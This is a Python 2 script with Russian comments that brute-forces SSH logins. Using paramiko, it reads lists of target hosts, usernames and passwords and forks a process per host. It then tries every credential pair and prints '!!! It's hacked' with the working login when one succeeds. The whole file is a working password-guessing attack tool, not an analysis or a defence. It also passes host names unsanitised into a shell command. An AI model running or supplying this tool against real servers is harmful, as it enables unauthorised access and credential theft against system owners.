#! /usr/bin/python
# -*- coding: utf-8 -*-

from paramiko import *	# Избавляемся от префикса paramiko
import commands 		# Либа для выполнения системной команды host в функции резолва доменов 
import socket			# Избавляемся от ошибки в эксепшне обрыва соединения
import os

# Открываем файлы
targets = 	open('./targets.lst').readlines()
logins 	= 	open('./logins.lst').readlines()
passwords = open('./passwords.lst').readlines()
results	=	open('./results.lst', 'w')
util.log_to_file('paramiko.log')	# Включаем логгирование в файл
# Инициализируем SSH-клиент
client = SSHClient()				# Создаём объект
client.load_system_host_keys()		# Подгружаем ключи хостов, а если ключа не нашлось =>
client.set_missing_host_key_policy(AutoAddPolicy()) # => добавляем автоматически

error=''; #trg=''; lgn=''; psw='' # Глобальные переменные

def resolv(host_n):
	'''Возвращает IP из полученной строки. Если строка содержит доменное имя,
		resolv() возвращает IP, если же получен IP, то resolv() отдаёт именно его'''
	cmd_s = "host " + host_n
	res = commands.getoutput(cmd_s).split()[3]
	if res == 'found:':
		return host_n
	else:
		return res

def child(target):
	global error
	#global trg
	#global lgn
	#global psw
	print 'Child:', os.getpid()
	for lgn in logins:
		lgn = lgn.strip() 
		if error == 'yes':
			error=''
			break
		for psw in passwords:
			psw = psw.strip()
			try:
				client.connect(target, username = lgn, password = psw, timeout=2)
				stdin, stdout, stderr = client.exec_command('date')
				print stdout
				print '!!! It\'s hacked', target, '!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!'
				print lgn, psw, '\n'
			except SSHException:
				print 'Wrong auth: ', target, '\n', lgn, psw, '\n'
			except socket.error:
				print "Connection refused to host", target, '\nGoing to next host\n\n'
				error='yes'
				break # skip host if it refused
	
	os._exit(0)

def parent():
	for trg in targets:
		trg = resolv(trg.strip())
		newpid = os.fork()
		print newpid
		if newpid == 0:
			child(trg)
		else:
			print('Exit!\n')

### MAIN ###
parent()